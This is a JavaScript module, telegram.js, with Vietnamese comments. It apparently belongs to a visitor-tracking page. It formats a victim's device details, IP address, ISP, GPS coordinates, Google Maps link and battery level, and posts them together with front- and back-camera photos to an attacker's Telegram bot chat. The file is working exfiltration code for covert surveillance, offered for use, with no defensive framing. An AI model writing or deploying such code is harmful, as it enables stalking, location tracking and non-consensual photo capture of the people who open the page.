// telegram.js - Gửi dữ liệu lên Telegram

const TelegramSender = {
    async sendMessage(text) {
        const url = `${CONFIG.TELEGRAM_API}${CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
            return response.ok;
        } catch(e) {
            console.error('❌ Lỗi gửi message:', e);
            return false;
        }
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return false;
        
        const url = `${CONFIG.TELEGRAM_API}${CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            return response.ok;
        } catch(e) {
            console.error('❌ Lỗi gửi ảnh:', e);
            return false;
        }
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
🖥️ *Hệ điều hành:* ${data.os || '?'}
🌐 *Trình duyệt:* ${data.browser || '?'}
🔤 *Ngôn ngữ:* ${data.language || '?'}
📺 *Màn hình:* ${data.screenSize || '?'}
⏰ *Múi giờ:* ${data.timezone || '?'}

🌍 *IP:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || '?'}
🏙️ *Địa chỉ:* ${data.location || '?'}
🌎 *Quốc gia:* ${data.country || '?'}
📍 *Tọa độ:* ${data.lat}, ${data.lon}

📌 *Google Maps:* ${data.maps || 'Không có'}

🔋 *Pin:* ${data.battery || '?'}
📸 *Camera:* ${data.camera || '?'}

⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        
        if (data.frontPhoto) {
            await this.sendPhoto(data.frontPhoto, '📸 ẢNH CAMERA TRƯỚC');
        }
        
        if (data.backPhoto) {
            await this.sendPhoto(data.backPhoto, '📸 ẢNH CAMERA SAU');
        }
        
        console.log('✅ Đã gửi toàn bộ dữ liệu lên Telegram');
        return true;
    }
};
